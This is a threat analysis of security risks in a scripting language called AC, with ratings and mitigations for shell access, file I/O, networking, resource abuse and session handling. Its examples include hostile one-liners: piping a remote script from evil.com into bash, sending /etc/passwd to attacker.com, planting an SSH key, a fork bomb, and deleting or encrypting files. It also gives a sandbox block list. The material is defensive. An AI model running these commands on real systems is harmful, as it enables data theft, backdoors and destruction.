# AC Security Threat Analysis: What CAN Go Wrong

Honest assessment of malicious intent vectors in AC (excluding `<Foreign>` tags).

---

## 1. **os.bash() — UNRESTRICTED BASH** 🔴 DANGEROUS

### What It Does

```ac
result = os.bash("any shell command here")
```

**No sandboxing. Full system access.**

### What a Malicious Actor Can Do

```ac
/* Delete all files */
os.bash("rm -rf /home/user/important_data")

/* Install malware */
os.bash("curl https://evil.com/malware.sh | bash")

/* Steal data */
os.bash("cat /etc/passwd | curl -d @- https://attacker.com")

/* Create backdoor */
os.bash("echo 'attacker ssh key' >> ~/.ssh/authorized_keys")

/* Modify system */
os.bash("sudo apt-get install evil-package")

/* Fork bomb (crash system) */
os.bash(":(){ :|:& };:")

/* Encrypt files for ransom */
os.bash("gpg --encrypt /home/user/documents/*")
```

### Protection Level

**NONE.** This is raw shell access.

### Mitigation

```ac
/* SAFE: Use os.sbash() instead (sandboxed) */
result = os.sbash("ls -la")    /* ✅ Safe */

/* DANGEROUS: Use os.bash() */
result = os.bash("rm -rf /")   /* ❌ Can destroy system */
```

### Rating: 🔴🔴🔴 CRITICAL RISK

---

## 2. **File I/O Operations** 🟠 MEDIUM RISK

### What It Does

AC has direct file I/O (not through bash):

```ac
/* Read files */
data = os.read($/etc/passwd$)
data = os.read($./config.json$)

/* Write files */
os.write_to($backdoor.sh$, $#!/bin/bash\nmalware code$)

/* Create/Delete files */
os.mkfile($evil.txt$)
os.rmfile($/important/data.txt$)
```

### Protection Level

**PARTIAL**. Path traversal is blocked by ilib/web but not by core os library:

```ac
/* SAFE: In web handler */
server.get($/file/:name$, fn(req)
    /* Path traversal blocked by ilib/web */
    data = file.read(req.params[$name$])  /* ✅ Protected */
)

/* NOT SAFE: Direct file operations */
data = os.read($../../etc/passwd$)  /* ⚠️ Depends on OS permissions */
```

### Mitigation

```ac
/* Use OS-level permissions */
/* Run AC process as unprivileged user */
/* Restrict file access with chroot/containers */
```

### Rating: 🟠 MEDIUM RISK

---

## 3. **Network Operations** 🟢 LOW RISK (Protected)

### What It Does

```ac
/* Make requests to external servers */
web.request_get("https://attacker.com/steal?data=secret")

/* Exfiltrate data */
payload = web.json({"password": "secret123"})
web.request_post("https://attacker.com/exfil", payload)

/* Participate in botnet */
web.request_get("https://c2server.com/cmd")
```

### Protection Level

**EXCELLENT**. Rate limiting prevents abuse:

```
Max: 10 requests/second per endpoint
Block: Loops detected and stopped
Duration: 1 second block per endpoint
```

### Can Attacker Bypass?

```ac
/* ❌ CANNOT: Spam requests in loop */
WHILST true
    web.request_get("https://target.com")  /* Blocked after 10 */

/* ❌ CANNOT: Hammer with concurrent requests */
threads = []
FOR i in range(100)
    spawn_thread(fn
        WHILST true
            web.request_get("https://target.com")
    fn)  /* Still rate-limited per endpoint */

/* ✅ CAN: Make 10 requests/second to 10 different endpoints */
/* But can't hammer a single target fast */
```

### Rating: 🟢 LOW RISK (Protected by runtime)

---

## 3. **Process Spawning** 🟠 MEDIUM RISK

### What It Does

```ac
/* Spawn child processes */
os.bash("fork_bomb &")       /* Background process */
os.bash("nohup malware &")   /* Detached process */

/* But: os.sbash() blocks these */
os.sbash("fork_bomb &")      /* ❌ BLOCKED: & not allowed */
os.sbash("nohup cmd")        /* ❌ BLOCKED: nohup not allowed */
```

### Protection Level

**PARTIAL**. `os.sbash()` blocks dangerous patterns:

```cpp
Blocked in sbash:
  sudo, su           /* Privilege escalation */
  nohup, disown      /* Detached processes */
  &                  /* Background execution */
  tmux, screen       /* Terminal multiplexing */
```

But `os.bash()` allows everything.

### Rating: 🟠 MEDIUM RISK (if using os.bash)

---

## 4. **Memory & CPU Abuse** 🟢 LOW RISK (Protected)

### What It Does

```ac
/* Allocate 10GB of memory */
buffer = []
WHILST true
    buffer.append("x" * 1000000)

/* Spin CPU at 100% */
WHILST true
    x = x + 1
```

### Protection Level

**EXCELLENT**. Runtime enforces limits:

```
Memory: Max 500MB per process (rejected after)
CPU: Spinning loops detected and throttled
```

### Rating: 🟢 LOW RISK (Protected by runtime)

---

## 5. **Database Access (JaSQL)** 🟢 LOW RISK

### What It Does

```ac
/* Query database */
datac result is "SELECT * FROM users"
result = web.jasql("DELETE FROM users", "data.datac")

/* But: parameterized queries are safe */
result = web.jasql("TAKE * FROM users IF id = ?", [user_id])
```

### Protection Level

**EXCELLENT**. JaSQL is **NOT SQL injection vulnerable**:

```ac
/* JaSQL parses strictly (not string-based) */
/* SAFE: Can't inject SQL via string concatenation */
query = "TAKE * FROM users IF id = " + user_id  /* Parses safely */

/* Even better: Use parameters */
web.jasql("TAKE * FROM users IF id = ?", [user_id])
```

### Rating: 🟢 LOW RISK (JaSQL is injection-safe)

---

## 6. **Session/Cookie Manipulation** 🟡 MEDIUM RISK

### What It Does

```ac
/* Read user cookies */
stolen_cookie = request.cookies["session_id"]

/* Modify response cookies */
response.set_cookie("admin", "true")  /* Fake admin cookie */

/* Forge JWT tokens */
fake_token = web.jwt_create({"user_id": "admin", "admin": true})
```

### Protection Level

**PARTIAL**. Depends on server implementation:

```ac
/* VULNERABLE: Server trusts cookie values */
IF request.cookies["admin"] == "true"
    grant_admin_access()

/* SAFE: Server signs and validates tokens */
IF verify_jwt_signature(token)
    IF token.payload.admin == true
        grant_admin_access()
```

### Rating: 🟡 MEDIUM RISK (app-dependent, not AC's fault)

---

## 7. **Denial of Service (Server)** 🟡 MEDIUM RISK

### What It Does

```ac
/* Accept connections but never respond */
server = web.httpServer("0.0.0.0", 8080)
server.get("/api", fn(req)
    /* Hang forever */
    WHILST true
        pass
fn)

/* Consume all memory slowly */
cache = []
server.get("/api", fn(req)
    cache.append("x" * 1000000)
fn)
```

### Protection Level

**PARTIAL**. Runtime protects **outgoing** DDoS but not **handling**:

```
✅ PROTECTED: Can't flood other servers
❌ NOT PROTECTED: Can write slow/bad handlers
```

### Mitigation

```ac
/* Use request timeouts */
server.request_timeout(30)  /* 30 second timeout */

/* Use connection limits */
server.max_connections(1000)

/* Don't allocate unbounded memory in handlers */
```

### Rating: 🟡 MEDIUM RISK (application-level issue)

---

## 8. **Information Disclosure** 🟡 MEDIUM RISK

### What It Does

```ac
/* Expose error messages (leaks info) */
server.get("/api/user/:id", fn(req)
    user = db.query("TAKE * FROM users IF id = ?", [req.params["id"]])
    RETURN web.json(user)  /* Exposes all user data */
)

/* Log secrets to stdout */
Term.display "Password: " + password  /* Logs to console */

/* Return sensitive data in responses */
RETURN web.json({"user": user, "internal_flag": "secret123"})
```

### Protection Level

**NONE.** This is application logic, not AC's responsibility.

### Mitigation

```ac
/* Filter sensitive data */
filtered = {
    "id": user["id"],
    "name": user["name"]
}
RETURN web.json(filtered)

/* Don't log secrets */
/* Use environment variables, not constants */
```

### Rating: 🟡 MEDIUM RISK (developer responsibility)

---

## 9. **Resource Exhaustion (Advanced)** 🟠 MEDIUM RISK

### What It Does

```ac
/* Create huge lists */
massive_list = []
FOR i in range(100000000)
    massive_list.append(i)

/* Create deeply nested objects */
nested = {"a": {"b": {"c": {"d": ...1000 levels deep... }}}
obj = web.json_parse(nested)  /* Parser OOM? */

/* Infinite recursion */
Make recurse func()
    recurse()  /* Stack overflow */
Make
recurse()
```

### Protection Level

**PARTIAL**:
- ✅ Memory limit: 500MB (catches most)
- ❌ Stack overflow: Not protected
- ❌ Parser bomb: Depends on parser

### Rating: 🟠 MEDIUM RISK (edge cases)

---

## Summary: Threat Matrix

| Vector | Risk | Protected | Mitigation |
|--------|------|-----------|-----------|
| **os.bash()** | 🔴 Critical | ❌ No | Use os.sbash() instead |
| **File I/O (os.read/write)** | 🟠 Medium | ⚠️ Partial | Run with minimal permissions |
| **Network DDoS** | 🟢 Low | ✅ Yes | Rate limiting in runtime |
| **Process spawning** | 🟠 Medium | ⚠️ Partial | Use os.sbash() |
| **Memory bombs** | 🟢 Low | ✅ Yes | 500MB limit enforced |
| **CPU spinning** | 🟢 Low | ✅ Yes | Loop detection enforced |
| **SQL injection** | 🟢 Low | ✅ Yes | JaSQL is injection-safe |
| **Session hijacking** | 🟡 Medium | ⚠️ App-dependent | Validate & sign tokens |
| **Server DoS** | 🟡 Medium | ⚠️ App-dependent | Timeouts + limits |
| **Info disclosure** | 🟡 Medium | ❌ No | Filter sensitive data |
| **Resource exhaustion** | 🟠 Medium | ⚠️ Partial | Memory limits catch most |

---

## The Bottom Line

### **Built-in Protections** ✅
- ✅ DDoS (outgoing requests)
- ✅ Ping floods
- ✅ Memory bombs
- ✅ CPU spinning
- ✅ SQL injection (JaSQL is injection-safe)

### **NOT Protected** ❌
- ❌ **os.bash()** — Unrestricted shell access
- ❌ **File I/O** — Can read/write/delete files
- ❌ **Application logic** — Bad handlers, information leaks
- ❌ **Session management** — Developer responsibility
- ❌ **Slow handlers** — Server DoS from bad code

### **Honest Security Posture**

**AC protects against:**
- Malicious **intent from clients** (DDoS, hammering)
- Malicious **patterns in loops** (rate-limited)
- Malicious **resource abuse** (memory/CPU bounded)

**AC does NOT protect against:**
- Malicious **intent from developers** (os.bash, file ops)
- Malicious **application logic** (bad handlers)
- Malicious **data disclosure** (developer's job to filter)

### **Recommendation**

```ac
✅ DO: Use os.sbash() (sandboxed)
✅ DO: Validate all inputs
✅ DO: Filter sensitive data from responses
✅ DO: Set request/connection timeouts
✅ DO: Run with minimal file permissions

❌ DON'T: Use os.bash() for untrusted operations
❌ DON'T: Trust user input
❌ DON'T: Log passwords/secrets
❌ DON'T: Write slow/hanging request handlers
```

**AC's job: Prevent accidental misuse and malicious clients**  
**Developer's job: Write secure application logic** 🔒
